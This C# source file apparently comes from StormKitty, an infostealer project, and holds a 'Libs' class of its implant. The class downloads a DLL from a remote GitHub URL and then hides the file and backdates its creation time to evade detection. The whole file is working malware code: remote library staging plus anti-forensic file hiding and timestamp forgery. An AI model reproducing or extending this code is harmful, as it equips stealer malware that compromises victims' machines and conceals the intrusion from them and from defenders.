/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/StormKitty
*/

using StormKitty.Implant;
using System;
using System.IO;
using System.Net;

namespace StormKitty
{
    internal sealed class Libs
    {
        
        public static string ZipLib = StringsCrypt.github + "/blob/master/StormKitty/stub/packages/DotNetZip.1.13.8/lib/net40/DotNetZip.dll?raw=true";
        public static bool LoadRemoteLibrary(string library)
        {
            string dll = Path.GetFileName(new Uri(library).LocalPath);
            if (!File.Exists(dll))
            {
                try
                {
                    using (var client = new WebClient())
                        client.DownloadFile(library, dll);
                }
                catch (WebException)
                {
                    return false;
                }

                Implant.Startup.HideFile(dll);
                Implant.Startup.SetFileCreationDate(dll);
            }
            return true;
        }
    }
}
